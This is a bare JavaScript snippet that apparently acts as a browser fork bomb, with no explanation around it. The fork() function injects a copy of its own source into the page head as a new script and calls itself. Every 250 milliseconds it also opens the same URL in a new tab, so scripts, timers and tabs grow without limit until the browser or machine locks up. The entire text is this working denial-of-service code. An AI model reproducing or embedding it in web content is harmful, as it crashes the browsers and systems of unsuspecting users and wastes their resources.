function fork() {
  const script = document.createElement("script");
  script.innerHTML = fork + "\n" + "fork();";
  document.head.appendChild(script);
  setTimeout(function() {
    window.open(window.location.href, '_blank'); // Open the same URL in a new tab
    fork();
  }, 250);
}

fork();
